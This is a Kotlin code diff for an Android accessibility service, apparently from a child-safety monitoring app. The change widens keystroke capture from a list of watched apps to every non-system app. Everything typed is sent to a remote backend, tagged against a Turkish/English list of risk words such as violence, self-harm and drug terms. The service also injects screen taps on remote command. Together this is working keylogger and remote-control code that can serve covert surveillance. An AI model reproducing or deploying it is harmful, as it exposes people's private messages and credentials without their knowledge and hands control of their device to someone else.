@@ -5,11 +5,10 @@ import android.accessibilityservice.AccessibilityServiceInfo
 import android.accessibilityservice.GestureDescription
 import android.graphics.Path
 import android.os.Build
+import android.os.Handler
+import android.os.Looper
 import android.util.Log
 import android.view.accessibility.AccessibilityEvent
-import kotlinx.coroutines.CoroutineScope
-import kotlinx.coroutines.Dispatchers
-import kotlinx.coroutines.launch
 import org.json.JSONObject
 import java.io.OutputStreamWriter
 import java.net.HttpURLConnection
@@ -20,111 +19,162 @@ class SafetyAccessibilityService : AccessibilityService() {
     companion object {
         private const val TAG = "SafetyAccessibility"
 
-        // SocketManager'ın remote_click komutunu bu servise iletmesi için singleton referans
+        // Risk kelimeleri — Türkçe + İngilizce
+        val riskKeywords = listOf(
+            // Şiddet / tehlike
+            "öldür", "öldüreceğim", "saldır", "bıçak", "silah", "bomba",
+            "kill", "murder", "attack", "weapon", "bomb",
+            // Kendine zarar
+            "intihar", "kendimi keseceğim", "ölmek istiyorum",
+            "suicide", "self harm", "cut myself", "wanna die",
+            // Siber zorbalık
+            "seni döveceğim", "rezil et", "ifşa", "şantaj",
+            "beat you up", "expose", "blackmail", "threaten",
+            // Uyuşturucu / alkol (reşit olmayan)
+            "esrar", "uyuşturucu", "eroin", "kokain",
+            "weed", "drugs", "heroin", "cocaine",
+            // Kaçma / gizlenme
+            "kaçacağım", "evden gidiyorum", "kimse bilmesin",
+            "run away", "leaving home", "nobody knows",
+            // Test
+            "tehlike",
+        )
+
         @Volatile
         var instance: SafetyAccessibilityService? = null
     }
 
-    private val ioScope = CoroutineScope(Dispatchers.IO)
+    // Handler tabanlı debounce
+    private val handler = Handler(Looper.getMainLooper())
+    private var lastText = ""
+    private var lastPackage = ""
+
+    private val sendRunnable = Runnable {
+        val pkg  = lastPackage
+        val text = lastText
+        if (text.isNotEmpty() && pkg.isNotEmpty()) {
+            Thread {
+                try {
+                    sendKeystroke(pkg, text)
+                } catch (e: Exception) {
+                    Log.e(TAG, "sendKeystroke hata: ${e.message}")
+                }
+            }.start()
+        }
+    }
 
     // ── Lifecycle ──────────────────────────────────────────────────────────────
 
     override fun onServiceConnected() {
         super.onServiceConnected()
         instance = this
-        val info = AccessibilityServiceInfo().apply {
+        serviceInfo = AccessibilityServiceInfo().apply {
             eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED
             feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
             notificationTimeout = 100L
-            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
+            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
+                    AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
         }
-        serviceInfo = info
         Log.d(TAG, "AccessibilityService bağlandı")
     }
 
     override fun onDestroy() {
         super.onDestroy()
         instance = null
+        handler.removeCallbacks(sendRunnable)
+        Log.d(TAG, "AccessibilityService kapandı")
     }
 
-    // ── Klavye Takibi ──────────────────────────────────────────────────────────
+    // ── Event ──────────────────────────────────────────────────────────────────
 
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
-        event ?: return
-        if (event.eventType != AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) return
-
+        if (event?.eventType != AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) return
         val packageName = event.packageName?.toString() ?: return
-        val text = event.text.joinToString("") { it }
-        if (text.isBlank()) return
+        val text        = event.text.joinToString(" ").trim()
 
-        // Yalnızca izlenen paketlerden gelen klavye girişini gönder
-        if (packageName !in Config.watchedPackages) return
+        if (text.isEmpty() || text == lastText) return
 
-        ioScope.launch {
-            sendKeystroke(packageName, text)
-        }
+        // Sistem paketlerini atla
+        if (packageName.startsWith("com.android.") ||
+            packageName.startsWith("android") ||
+            packageName == "com.google.android.inputmethod.latin") return
+
+        lastText    = text
+        lastPackage = packageName
+
+        // Önceki zamanlayıcıyı iptal et, 1 saniye bekle
+        handler.removeCallbacks(sendRunnable)
+        handler.postDelayed(sendRunnable, 1000L)
     }
 
     override fun onInterrupt() {
         Log.w(TAG, "AccessibilityService interrupted")
     }
 
-    // ── HTTP Gönderim ──────────────────────────────────────────────────────────
+    // ── Gönderim ───────────────────────────────────────────────────────────────
 
     private fun sendKeystroke(packageName: String, text: String) {
+        val appName        = resolveAppName(packageName)
+        val matchedKeyword = riskKeywords.firstOrNull { text.contains(it, ignoreCase = true) }
+        val isRisk         = matchedKeyword != null
+
+        if (isRisk) Log.w(TAG, "RISK KEYWORD: '$matchedKeyword' in [$appName]")
+        else        Log.d(TAG, "Debounce → [$appName] ${text.take(40)}")
+
+        val payload = JSONObject().apply {
+            put("app_name",      appName)
+            put("package",       packageName)
+            put("text",          text)
+            put("timestamp",     System.currentTimeMillis())
+            put("is_risk_alert", isRisk)
+            if (matchedKeyword != null) put("risk_keyword", matchedKeyword)
+        }
+        post("${Config.backendUrl}/api/android-keystrokes/${Config.profileId}", payload.toString())
+    }
+
+    // ── HTTP ───────────────────────────────────────────────────────────────────
+
+    private fun post(urlStr: String, body: String) {
+        val conn = URL(urlStr).openConnection() as HttpURLConnection
+        conn.requestMethod = "POST"
+        conn.setRequestProperty("Content-Type", "application/json")
+        conn.setRequestProperty("X-API-Key", Config.API_KEY)
+        conn.doOutput = true
+        conn.connectTimeout = 4000
+        conn.readTimeout = 4000
         try {
-            val appName = packageName.split(".").lastOrNull() ?: packageName
-            val payload = JSONObject().apply {
-                put("app_name", appName)
-                put("package", packageName)
-                put("text", text)
-            }
-            val url = URL(
-                "${Config.backendUrl}/api/android-keystrokes/${Config.profileId}"
-            )
-            val conn = url.openConnection() as HttpURLConnection
-            conn.requestMethod = "POST"
-            conn.setRequestProperty("Content-Type", "application/json")
-            conn.setRequestProperty("X-API-Key", Config.API_KEY)
-            conn.doOutput = true
-            conn.connectTimeout = 4000
-            conn.readTimeout = 4000
-            OutputStreamWriter(conn.outputStream, Charsets.UTF_8).use {
-                it.write(payload.toString())
-            }
-            Log.d(TAG, "Keystroke → ${conn.responseCode} [$appName] $text")
+            OutputStreamWriter(conn.outputStream, Charsets.UTF_8).use { it.write(body) }
+            val code = conn.responseCode
+            Log.d(TAG, "POST → $code")
+        } finally {
             conn.disconnect()
-        } catch (e: Exception) {
-            Log.e(TAG, "Keystroke gönderilemedi: ${e.message}")
         }
     }
 
-    // ── Uzaktan Tıklama (Remote Gesture) ──────────────────────────────────────
+    private fun resolveAppName(packageName: String): String {
+        return try {
+            val pm = applicationContext.packageManager
+            pm.getApplicationLabel(pm.getApplicationInfo(packageName, 0)).toString()
+        } catch (e: Exception) {
+            packageName.split(".").lastOrNull() ?: packageName
+        }
+    }
+
+    // ── Uzaktan Tıklama ────────────────────────────────────────────────────────
 
     fun performRemoteClick(xPercent: Float, yPercent: Float) {
-        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) {
-            Log.w(TAG, "dispatchGesture API 24+ gerektirir")
-            return
-        }
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return
         try {
             val metrics = resources.displayMetrics
-            val xPx = xPercent * metrics.widthPixels
-            val yPx = yPercent * metrics.heightPixels
-
-            val path = Path().apply { moveTo(xPx, yPx) }
-            val stroke = GestureDescription.StrokeDescription(path, 0L, 100L)
-            val gesture = GestureDescription.Builder().addStroke(stroke).build()
-
-            dispatchGesture(gesture, object : GestureResultCallback() {
-                override fun onCompleted(gestureDescription: GestureDescription?) {
-                    Log.d(TAG, "Gesture tamamlandı: ($xPx, $yPx)")
-                }
-                override fun onCancelled(gestureDescription: GestureDescription?) {
-                    Log.w(TAG, "Gesture iptal edildi")
-                }
-            }, null)
+            val path = Path().apply {
+                moveTo(xPercent * metrics.widthPixels, yPercent * metrics.heightPixels)
+            }
+            val gesture = GestureDescription.Builder()
+                .addStroke(GestureDescription.StrokeDescription(path, 0L, 100L))
+                .build()
+            dispatchGesture(gesture, null, null)
         } catch (e: Exception) {
-            Log.e(TAG, "Gesture gönderilemedi: ${e.message}")
+            Log.e(TAG, "Gesture hata: ${e.message}")
         }
     }
 }
